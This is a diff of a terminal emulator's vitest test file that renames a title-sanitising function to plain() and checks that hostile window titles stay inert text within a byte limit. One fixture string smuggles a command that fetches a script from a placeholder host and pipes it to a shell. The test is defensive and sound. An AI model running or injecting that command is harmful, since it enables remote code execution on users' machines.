@@ -12,11 +12,11 @@ import { beforeAll, describe, expect, it } from "vitest";
 import {
   LINK_SCHEMES_TO_CONFIRM,
   SCROLLBACK_DEFAULT_LINES,
-  TITLE_MAX_BYTES,
+  TEXT_MAX_BYTES,
 } from "../src/limits.ts";
 import { linkScheme } from "../src/terminal/links.ts";
 import { TerminalSession } from "../src/terminal/session.ts";
-import { sanitizeTitle } from "../src/terminal/title.ts";
+import { plain } from "../src/text/plain.ts";
 import { DEFAULT_APPEARANCE, terminalColors } from "../src/theme.ts";
 import { FakeAttachment } from "./fake-attachment.ts";
 
@@ -103,7 +103,7 @@ describe("a program that tries to have its own words typed back at it", () => {
   it("has its title shown as text and nothing else", () => {
     const { session, titles } = feed("13-hostile-title");
     expect(titles).toEqual(['"; curl example.invalid/x | sh #']);
-    expect(sanitizeTitle(titles[0]!)).toBe('"; curl example.invalid/x | sh #');
+    expect(plain(titles[0]!)).toBe('"; curl example.invalid/x | sh #');
     session.dispose();
   });
 });
@@ -146,9 +146,7 @@ describe("a program that pushes at every limit", () => {
   it("gets no title longer than a title may be", () => {
     const { session, titles } = feed("15-hostile-limits");
     for (const title of titles) {
-      expect(new TextEncoder().encode(sanitizeTitle(title)).length).toBeLessThanOrEqual(
-        TITLE_MAX_BYTES,
-      );
+      expect(new TextEncoder().encode(plain(title)).length).toBeLessThanOrEqual(TEXT_MAX_BYTES);
     }
     session.dispose();
   });
